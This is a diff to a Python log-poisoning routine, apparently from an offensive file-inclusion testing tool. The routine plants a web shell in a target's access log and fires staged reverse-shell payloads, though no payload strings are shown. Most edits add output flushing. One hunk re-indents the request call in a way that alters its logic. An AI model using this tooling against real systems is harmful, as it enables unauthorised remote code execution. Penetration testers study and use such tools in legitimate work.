@@ -29,14 +29,16 @@ def exploit_log_poison(
             + scriptDirectory
             + os.sep
             + "src/wordlists/http_access_log.txt"
-            + "' file that contains log locations"
+            + "' file that contains log locations",
+            flush = True
         )
         return
 
     with open(scriptDirectory + os.sep + "src/wordlists/http_access_log.txt", "r", encoding="latin1") as f:
         print(
             colors.green("[i]")
-            + " Enumerating file system to discover access log location..."
+            + " Enumerating file system to discover access log location...",
+            flush = True
         )
         lines = f.readlines()
         for line in lines:
@@ -74,7 +76,8 @@ def exploit_log_poison(
                     + colors.green("[.]")
                     + " Located canary in target's access log at '"
                     + line
-                    + "'"
+                    + "'",
+                    flush = True
                 )
 
                 # Upload web shell inside log
@@ -112,8 +115,7 @@ def exploit_log_poison(
                 elif config.tempArg in post:
                     exploitPost = post + "&c=" + payloadStageOne
 
-                print(exploitUrl)
-                res, _ = request.REQUEST(
+                    res, _ = request.REQUEST(
                     exploitUrl,
                     args.httpheaders,
                     post,
@@ -129,7 +131,8 @@ def exploit_log_poison(
                     if config.tempArg in post:
                         print(
                             colors.green("[.]")
-                            + " Executing stage 1 of the revshell payload..."
+                            + " Executing stage 1 of the revshell payload...",
+                            flush = True
                         )
                         request.REQUEST(
                             url,
@@ -144,7 +147,8 @@ def exploit_log_poison(
                         if payloadStageTwo != "":
                             print(
                                 colors.green("[.]")
-                                + " Executing stage 2 of the revshell payload..."
+                                + " Executing stage 2 of the revshell payload...",
+                                flush = True
                             )
                             request.REQUEST(
                                 url,
@@ -164,7 +168,8 @@ def exploit_log_poison(
                         )
                         print(
                             colors.green("[.]")
-                            + " Executing stage 1 of the revshell payload..."
+                            + " Executing stage 1 of the revshell payload...",
+                            flush = True
                         )
                         request.REQUEST(
                             exploitUrl,
@@ -184,7 +189,8 @@ def exploit_log_poison(
                             )
                             print(
                                 colors.green("[.]")
-                                + " Executing stage 2 of the revshell payload. Check your listener..."
+                                + " Executing stage 2 of the revshell payload. Check your listener...",
+                                flush = True
                             )
                             request.REQUEST(
                                 exploitUrl,
